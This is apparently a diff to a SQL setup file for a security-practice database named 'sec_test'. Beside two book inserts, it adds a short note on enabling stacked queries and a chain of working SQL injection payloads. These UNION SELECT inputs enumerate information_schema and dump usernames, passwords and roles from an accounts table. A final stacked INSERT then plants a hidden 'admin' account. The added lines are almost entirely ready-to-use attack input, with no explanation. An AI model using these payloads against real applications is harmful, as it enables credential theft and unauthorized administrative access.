@@ -14,3 +14,19 @@ CREATE TABLE products(
 );
 INSERT INTO `products`(`name`, `category`, `cost`) VALUES ('book1', 'book', 10);
 INSERT INTO `products`(`name`, `category`, `cost`) VALUES ('book2', 'book', 15);
+
+
+// var connection = mysql.createConnection({multipleStatements: true}); cause multiple sql
+// comment in mariaDB: #
+
+
+// 
+ %' UNION SELECT TABLE_SCHEMA, 1, 2 FROM information_schema.TABLES WHERE TABLE_SCHEMA LIKE '%
+
+%' UNION SELECT TABLE_SCHEMA, TABLE_NAME, 2 FROM information_schema.TABLES WHERE TABLE_SCHEMA='sec_test' AND TABLE_NAME LIKE '%
+
+%' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sec_test' AND TABLE_NAME='accounts' AND COLUMN_NAME LIKE '%
+
+%' UNION SELECT username, password, role FROM sec_test.accounts WHERE username LIKE '%
+
+%'; INSERT INTO sec_test.accounts (username, password, role) VALUES('temp1234', 'temp1234', 'admin'); #
